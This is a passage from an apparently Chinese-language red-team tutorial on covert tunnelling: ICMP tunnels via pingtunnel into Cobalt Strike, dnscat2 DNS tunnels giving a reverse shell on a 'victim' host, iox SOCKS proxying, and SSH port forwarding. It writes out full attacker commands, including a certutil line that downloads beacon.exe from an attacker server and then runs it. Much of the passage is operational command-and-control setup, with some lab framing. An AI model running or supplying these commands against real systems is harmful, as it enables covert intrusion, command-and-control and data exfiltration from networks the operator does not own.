+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l [本机IP：ICMP隧道端口] -s [服务端IP_VPS] -t [服务端IP_VPS:ICMP隧道转发至VPS的端口] -tcp 1 -noprint 1 -nolog 1 -key [密钥]</span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:2222 -s 1.x.x.x -t x.x.x.x:3333 -tcp 1 -noprint 1 -nolog 1 -key 000000</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180113881.png" data-caption="image-20230430180113881"><img src="/../images/tunnel/image-20230430180113881.png" alt="image-20230430180113881"></a></p>
+<p>2、Cobaltstrike 新建两个监听，一个为转发 ICMP 的 2222 端口 host 为 127.0.0.1（这个主要用于生成本地地址的 beacon），另一个监听端口为 ICMP 流量转发到 VPS 的服务端口 3333。</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180236000.png" data-caption="image-20230430180236000"><img src="/../images/tunnel/image-20230430180236000.png" alt="image-20230430180236000"></a></p>
+<p>生成 cs 马</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180319548.png" data-caption="image-20230430180319548"><img src="/../images/tunnel/image-20230430180319548.png" alt="image-20230430180319548"></a></p>
+<p>受害主机执行 beacon，由于 Cobaltstrike 马监听的端口是 2222 ，马儿流量通过 2222 端口，即 ICMP 隧道端口转发出去，到了服务端（VPS）上，然后 ICMP 上的流量通过 2222 转发到 3333 端口，实现间接上线。</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230421160516688.png" data-caption="image-20230421160516688"><img src="/../images/tunnel/image-20230421160516688.png" alt="image-20230421160516688"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180515064.png" data-caption="image-20230430180515064"><img src="/../images/tunnel/image-20230430180515064.png" alt="image-20230430180515064"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180805743.png" data-caption="image-20230430180805743"><img src="/../images/tunnel/image-20230430180805743.png" alt="image-20230430180805743"></a></p>
+<br/>
+
+
+<h4 id="Pingtunel-配合-iox-代理-socks-出网"><a href="#Pingtunel-配合-iox-代理-socks-出网" class="headerlink" title="Pingtunel 配合 iox 代理 socks 出网"></a>Pingtunel 配合 iox 代理 socks 出网</h4><p>Pingtunnel 搭建完 ICMP 隧道后，通过 iox 配合代理 Socks5 出网，以达到内网穿透。</p>
+<p>1、服务端（VPS），Pingtunnel 搭建 ICMP 隧道，这里选择不打印日志</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -type server -noprint 1 -nolog 1 -key 000000</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423100812628.png" data-caption="image-20230423100812628"><img src="/../images/tunnel/image-20230423100812628.png" alt="image-20230423100812628"></a></p>
+<p>2、客户端（受害主机），启动 Pingtunnel ，打通 ICMP 隧道（注意 ICMP 转发方式为 TCP）</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l [本机IP：ICMP隧道端口] -s [服务端IP_VPS] -t [服务端IP_VPS:ICMP隧道转发至VPS的端口] -tcp 1 -noprint 1 -nolog 1 -key [密钥]</span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:3389 -s 1.x.x.x -t 1.x.x.x:3333 -tcp 1 -noprint 1 -nolog 1 -key 000000</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180930005.png" data-caption="image-20230430180930005"><img src="/../images/tunnel/image-20230430180930005.png" alt="image-20230430180930005"></a></p>
+<p>3、服务端（VPS），启动 iox 服务端，接收从 3333 端口的流量转发至 4444 端口</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./iox proxy -l 3333 -l 4444</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423104609449.png" data-caption="image-20230423104609449"><img src="/../images/tunnel/image-20230423104609449.png" alt="image-20230423104609449"></a></p>
+<p>4、客户端（受害者），启动 iox 客户端，将 3389 流量转发出网，由于 3389 已建立 ICMP 隧道，所以 iox 代理的 Socks 流量将通过 ICMP 隧道出网。</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iox.exe proxy -r 127.0.0.1:3389</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423104802107.png" data-caption="image-20230423104802107"><img src="/../images/tunnel/image-20230423104802107.png" alt="image-20230423104802107"></a></p>
+<p>服务端接收到信息，成功建立通讯</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181009608.png" data-caption="image-20230430181009608"><img src="/../images/tunnel/image-20230430181009608.png" alt="image-20230430181009608"></a></p>
+<p>5、通过 proxifier 代理 socks 流量，实现本机访问内网</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423105015390.png" data-caption="image-20230423105015390"><img src="/../images/tunnel/image-20230423105015390.png" alt="image-20230423105015390"></a></p>
+<p>未进行代理时，本机无法访问内网资源</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423100206006.png" data-caption="image-20230423100206006"><img src="/../images/tunnel/image-20230423100206006.png" alt="image-20230423100206006"></a></p>
+<p>代理后，本机可访问内网资源</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423100458787.png" data-caption="image-20230423100458787"><img src="/../images/tunnel/image-20230423100458787.png" alt="image-20230423100458787"></a></p>
+<h2 id="三、DNS-隧道搭建"><a href="#三、DNS-隧道搭建" class="headerlink" title="三、DNS 隧道搭建"></a>三、DNS 隧道搭建</h2><p>DNS 隧道是将其它协议的内容封装在 DNS 协议中，以 DNS 请求和响应包完成传输数据的技术。使用 DNS 隧道需要使用一个子域名来进行隧道通信，而不能直接使用主域名，因为 DNS 隧道的工作原理是将隧道数据通过 DNS 协议传输，因此需要使用一个独立的子域名来进行通信，以避免影响到主域名的解析。</p>
+<h3 id="隧道搭建-1"><a href="#隧道搭建-1" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><p>DNS 隧道搭建使用 dnscat2，项目地址 <a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p>
+<p>1、配置子域名解析，并开放 udp、tcp 53端口，这边使用腾讯云进行域名配置，如何购买不再赘述，购买完域名后，直接搜索 DNS 进入 <code>DNS 解析 DNSPod</code>，对域名添加记录 A 记录以及 NS 记录。该作用是：将NS 记录的 log.xxx.xxx 子域名下所有 DNS 解析交给 A 记录的 ns1.xxx.xxx 处理。</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181535026.png" data-caption="image-20230430181535026"><img src="/../images/tunnel/image-20230430181535026.png" alt="image-20230430181535026"></a></p>
+<p>开放 udp、tcp 53端口</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230424093842332.png" data-caption="image-20230424093842332"><img src="/../images/tunnel/image-20230424093842332.png" alt="image-20230424093842332"></a></p>
+<p>验证域名解析设置是否成功，能正常 PING 域名，解析正常</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181644239.png" data-caption="image-20230430181644239"><img src="/../images/tunnel/image-20230430181644239.png" alt="image-20230430181644239"></a></p>
+<p>然后在 VPS 上使用 tcpdump 监听 udp 53 端口（ubuntu 上安装 tcpdump ：sudo apt-get install tcpdump）</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -n -i eth0 udp dst port 53</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230424093927718.png" data-caption="image-20230424093927718"><img src="/../images/tunnel/image-20230424093927718.png" alt="image-20230424093927718"></a></p>
+<p>使用本地电脑 nslookup NS 记录值，若 vps 上 tcpdump 返回查询信息则证明环境正常</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181752847.png" data-caption="image-20230430181752847"><img src="/../images/tunnel/image-20230430181752847.png" alt="image-20230430181752847"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181955810.png" data-caption="image-20230430181955810"><img src="/../images/tunnel/image-20230430181955810.png" alt="image-20230430181955810"></a>1</p>
+<p>3、服务端配置 dnscat2 这边使用公网 ubuntu 作为服务端，注意：使用前查看系统是否有程序占用 TCP 和 UDP 的 53 端口，若有，需要先暂停该程序 ，Ubuntu 上 systemd-resolved 会占用 53 端口，以下命令能暂停服务</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service systemd-resolved stop			# 停止 systemd-resolved 服务</span><br><span class="line">systemctl disable systemd-resolved		# 设置开机不启动</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>安装 dnscat2</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2</span><br><span class="line">cd dnscat2/server</span><br><span class="line">apt install gem ruby-dev libpq-dev</span><br><span class="line">gem install bundler</span><br><span class="line">bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>服务端（vps），启动 dnscat2 服务</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd dnscat2/server</span><br><span class="line">sudo ruby dnscat2.rb [NS上机记录.域名] -c [密钥]</span><br><span class="line">sudo ruby dnscat2.rb log.xxx.xxx -c 000000</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430182353337.png" data-caption="image-20230430182353337"><img src="/../images/tunnel/image-20230430182353337.png" alt="image-20230430182353337"></a></p>
+<p>4、配置客户端，二进制文件下载地址：<a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a> ，客户端（受害主机）启动 dnscat2 服务</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnscat2-v0.07-client-win32.exe --secret=[密钥] [NS 记录值] --delay 5000</span><br><span class="line">dnscat2-v0.07-client-win32.exe --secret=000000 log.xxx.xxx --delay 5000</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430182441235.png" data-caption="image-20230430182441235"><img src="/../images/tunnel/image-20230430182441235.png" alt="image-20230430182441235"></a></p>
+<p>5、查看服务端，返回一个 session 类似 msf 一般</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430182555251.png" data-caption="image-20230430182555251"><img src="/../images/tunnel/image-20230430182555251.png" alt="image-20230430182555251"></a></p>
+<p>使用 <code>session -i 1</code> 或者 <code>window -i 1</code> 进入 shell</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425105649239.png" data-caption="image-20230425105649239"><img src="/../images/tunnel/image-20230425105649239.png" alt="image-20230425105649239"></a></p>
+<p>执行 <code>shell</code> 命令，获取受害者主机反弹 <code>shell</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425105802478.png" data-caption="image-20230425105802478"><img src="/../images/tunnel/image-20230425105802478.png" alt="image-20230425105802478"></a></p>
+<p>执行 session -i 2 进入反弹 shell 终端</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425105902471.png" data-caption="image-20230425105902471"><img src="/../images/tunnel/image-20230425105902471.png" alt="image-20230425105902471"></a></p>
+<p>DNS隧道流量如下，中继模式没有 dnscat 关键字，但会暴露域名信息。</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430182842692.png" data-caption="image-20230430182842692"><img src="/../images/tunnel/image-20230430182842692.png" alt="image-20230430182842692"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183326994.png" data-caption="image-20230430183326994"><img src="/../images/tunnel/image-20230430183326994.png" alt="image-20230430183326994"></a></p>
+<h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="dnscat2-上线-Cobastrike"><a href="#dnscat2-上线-Cobastrike" class="headerlink" title="dnscat2 上线 Cobastrike"></a>dnscat2 上线 Cobastrike</h4><p>1、cobastrike 启动监听</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183458656.png" data-caption="image-20230430183458656"><img src="/../images/tunnel/image-20230430183458656.png" alt="image-20230430183458656"></a></p>
+<p>2、服务端（VPS），启动服务</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ruby ./dnscat2.rb [NS上机记录.域名] -e open -c 000000 --no-cache</span><br><span class="line">sudo ruby ./dnscat2.rb log.xxx.xxx -e open -c 000000 --no-cache</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183801644.png" data-caption="image-20230430183801644"><img src="/../images/tunnel/image-20230430183801644.png" alt="image-20230430183801644"></a></p>
+<p>3、客户端（受害者），启动服务</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscat2-v0.07-client-win32.exe --secret=000000 log.xxx.xxx --delay 5000</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183836873.png" data-caption="image-20230430183836873"><img src="/../images/tunnel/image-20230430183836873.png" alt="image-20230430183836873"></a></p>
+<p>4、远程下载 beacon 执行上线</p>
+<p>服务器利用 python 启临时web服务</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 4444</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430160918692.png" data-caption="image-20230430160918692"><img src="/../images/tunnel/image-20230430160918692.png" alt="image-20230430160918692"></a></p>
+<p>服务端进入 shell ，通过 certutil.exe 远程下载 beacon 上线主机</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://x.x.x.x:4444/beacon.exe C:\Users\Public\beacon.exe</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183925696.png" data-caption="image-20230430183925696"><img src="/../images/tunnel/image-20230430183925696.png" alt="image-20230430183925696"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430163507584.png" data-caption="image-20230430163507584"><img src="/../images/tunnel/image-20230430163507584.png" alt="image-20230430163507584"></a></p>
+<p>执行 beacon.exe 实现上线</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public\beacon.exe</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430163700295.png" data-caption="image-20230430163700295"><img src="/../images/tunnel/image-20230430163700295.png" alt="image-20230430163700295"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430184021047.png" data-caption="image-20230430184021047"><img src="/../images/tunnel/image-20230430184021047.png" alt="image-20230430184021047"></a></p>
+<h2 id="四、SSH-隧道"><a href="#四、SSH-隧道" class="headerlink" title="四、SSH 隧道"></a>四、SSH 隧道</h2><p>SSH 隧道（SSH Tunnel）是通过 SSH 协议建立的安全网络通道，可以将本地计算机和远程服务器之间的通信流量加密传输，用于传输不安全的协议或访问受限资源，除此之外还可以用来绕过防火墙限制，帮助用户绕过网络访问。</p>
+<h3 id="隧道搭建-2"><a href="#隧道搭建-2" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 主机                           | 环境             |</span><br><span class="line">| ------------------------------ | ---------------- |</span><br><span class="line">| 192.168.11.137                 | 攻击机           |</span><br><span class="line">| 192.168.11.128、192.168.20.100 | 受害者（双网卡） |</span><br><span class="line">| 192.168.20.200                 | 内网主机         |</span><br></pre></td></tr></table></figure></div>
+
+
+<p>攻击机 192.168.11.137 ，模拟公网 VPS</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426205042250.png" data-caption="image-20230426205042250"><img src="/../images/tunnel/image-20230426205042250.png" alt="image-20230426205042250"></a></p>
+<p>受害者，双网卡</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426210952158.png" data-caption="image-20230426210952158"><img src="/../images/tunnel/image-20230426210952158.png" alt="image-20230426210952158"></a></p>
+<p>内网主机</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426211026202.png" data-caption="image-20230426211026202"><img src="/../images/tunnel/image-20230426211026202.png" alt="image-20230426211026202"></a></p>
+<p>1、前期环境配置，攻击机上开启ssh转发功能，将GatewayPorts no改成yes并且把前面注释去掉，改为如下图</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426211345157.png" data-caption="image-20230426211345157"><img src="/../images/tunnel/image-20230426211345157.png" alt="image-20230426211345157"></a></p>
+<p>重启ssh服务</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426212238887.png" data-caption="image-20230426212238887"><img src="/../images/tunnel/image-20230426212238887.png" alt="image-20230426212238887"></a></p>
+<h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h4><p>SSH 本地端口转发（Local Port Forwarding）将本地计算机上的端口映射到远程计算机上的技术。</p>
+<p>1、跳板机（双网卡主机）,修改 ssh 配置文件 <code>vim /etc/ssh/sshd_config</code>，配置如下</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AllowTcpForwarding yes 			# 允许转发TCP协议</span><br><span class="line">GatewayPorts yes 				# 允许远程主机连接本地转发端口</span><br><span class="line">PermitRootLogin yes 			# 允许root登录</span><br><span class="line">TCPKeepAlive yes 				# 保持心跳，防止ssh断开</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426214010225.png" data-caption="image-20230426214010225"><img src="/../images/tunnel/image-20230426214010225.png" alt="image-20230426214010225"></a></p>
+<p>修改完成，重启 ssh服务</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426214048954.png" data-caption="image-20230426214048954"><img src="/../images/tunnel/image-20230426214048954.png" alt="image-20230426214048954"></a></p>
+<p>2、攻击机（VPS）192.168.11.137 与 受害主机 192.168.11.128（web 服务端）建立隧道。使用 ssh 连接到 ip 地址为 192.168.11.128 的主机，使用 funsiooo 用户身份登录，并在本地计算机上创建一个 8888 端口转发，将本地端口 8888 连接到内网的 192.168.20.200 的 22 端口上，实现 ssh 隧道访问隔离网段的内网主机</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L [本机端口]:[隧道访问的内网主机]:[隧道访问的内网主机端口] [双网卡跳板机SSH连接命令]</span><br><span class="line">ssh -CfNg -L 8888:192.168.20.200:22 funsiooo@192.168.11.128</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<ul>
+<li><code>-C</code>: 启用压缩功能，可以减少数据传输量。</li>
+<li><code>-f</code>: 在后台运行SSH客户端。</li>
+<li><code>-N</code>: 不执行任何命令，只进行端口转发。</li>
+<li><code>-g</code>: 允许远程主机通过转发端口连接本地计算机。</li>
+<li><code>-L</code>: 指定本地端口转发规则，格式为<code>本地端口:目标地址:目标端口</code></li>
+</ul>
+</blockquote>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426222124373.png" data-caption="image-20230426222124373"><img src="/../images/tunnel/image-20230426222124373.png" alt="image-20230426222124373"></a></p>
+<p>查看端口 8888 的占用情况，处于监听状态，正常工作状态</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp | grep 8888</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426222449818.png" data-caption="image-20230426222449818"><img src="/../images/tunnel/image-20230426222449818.png" alt="image-20230426222449818"></a></p>
+<p>3、通过本机连接内网 192.168.20.200 主机，因为 ssh 隧道已搭建，所以当我们 ssh 本机的 8888 端口时，ssh 隧道会将 8888 端口的流量通过跳板机 192.168.11.128 中的 192.168.20.100 网卡访问 192.168.20.200 的 22 端口，实现跨网段访问，注意这次的 ssh 密钥为 192.168.20.200 主机的 ssh 密码（当内网主机为 windows 时，22 端口可变为 3389，在知道密码的情况下可跨网段远程连接windows）</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 8888 root@127.0.0.1</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426222914800.png" data-caption="image-20230426222914800"><img src="/../images/tunnel/image-20230426222914800.png" alt="image-20230426222914800"></a></p>
+<p>隧道流量如下</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426223551493.png" data-caption="image-20230426223551493"><img src="/../images/tunnel/image-20230426223551493.png" alt="image-20230426223551493"></a></p>
+<h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h4><p>SSH 远程端口转发（Remote Port Forwarding）将远程计算机上的端口映射到本地计算机上的端口的技术。</p>
+<p>1、跳板机（双网卡）上执行命令，利用 ssh 建立隧道，将 192.168.20.200 的 22 端口流量转发至攻击者主机 192.168.11.137 的 2222 端口上，隧道建立后，可通过攻击者主机的 2222 端口访问隔离网段 192.168.20.200 的 22 端口，实现跨网段访问。注意此处的 ssh 密码为攻击者 192.168.11.137 主机的 ssh 密码。</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -R [远程主机端口]: [目标主机]: [目标主机端口] [攻击者主机]</span><br><span class="line">ssh -R 2222:192.168.20.200:22  root@192.168.11.137</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427211839927.png" data-caption="image-20230427211839927"><img src="/../images/tunnel/image-20230427211839927.png" alt="image-20230427211839927"></a></p>
+<p>攻击者主机 2222 端口正在监听</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427211827875.png" data-caption="image-20230427211827875"><img src="/../images/tunnel/image-20230427211827875.png" alt="image-20230427211827875"></a></p>
+<p>2、攻击机上访问内网主机</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2222 root@127.0.0.1</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427212257242.png" data-caption="image-20230427212257242"><img src="/../images/tunnel/image-20230427212257242.png" alt="image-20230427212257242"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427212206037.png" data-caption="image-20230427212206037"><img src="/../images/tunnel/image-20230427212206037.png" alt="image-20230427212206037"></a></p>
+<p>隧道流量如下</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427212655830.png" data-caption="image-20230427212655830"><img src="/../images/tunnel/image-20230427212655830.png" alt="image-20230427212655830"></a></p>
+<h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h4><p>SSH 动态转发（Dynamic Port Forwarding），也称为 SOCKS 代理，在本地计算机上设置一个 SOCKS 代理，通过 SSH 隧道将网络流量转发到远程服务器上，实现突破边界，访问内部网络资源，类似 frp socks 代理。</p>
+<p>1、服务端（VPS），ssh 开启转发功能，将 GatewayPorts no 改成 yes 并且把前面注释去掉</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427202212608.png" data-caption="image-20230427202212608"><img src="/../images/tunnel/image-20230427202212608.png" alt="image-20230427202212608"></a></p>
+<p>重启 ssh 服务</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430185530115.png" data-caption="image-20230430185530115"><img src="/../images/tunnel/image-20230430185530115.png" alt="image-20230430185530115"></a></p>
+<p>2、客户端（受害者），通过 ssh 开启本地代理 135 端口（端口任意），然后输入本地 ssh 密码，进行监听</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D 0.0.0.0:135 funsiooo@localhost</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430185640688.png" data-caption="image-20230430185640688"><img src="/../images/tunnel/image-20230430185640688.png" alt="image-20230430185640688"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427203742086.png" data-caption="image-20230427203742086"><img src="/../images/tunnel/image-20230427203742086.png" alt="image-20230427203742086"></a></p>
+<p>利用 ssh 远程转发到公网的服务端（VPS）的 2222 端口，此时输入的密码是服务端（VPS）的ssh密码</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -R 0.0.0.0:2222:0.0.0.0:135 root@公网vps</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430185843591.png" data-caption="image-20230430185843591"><img src="/../images/tunnel/image-20230430185843591.png" alt="image-20230430185843591"></a></p>
+<p>服务端（VPS）2222端口已正在监听中</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427203538104.png" data-caption="image-20230427203538104"><img src="/../images/tunnel/image-20230427203538104.png" alt="image-20230427203538104"></a></p>
+<p>3、本机利用 Proxifier 连接 Socks</p>
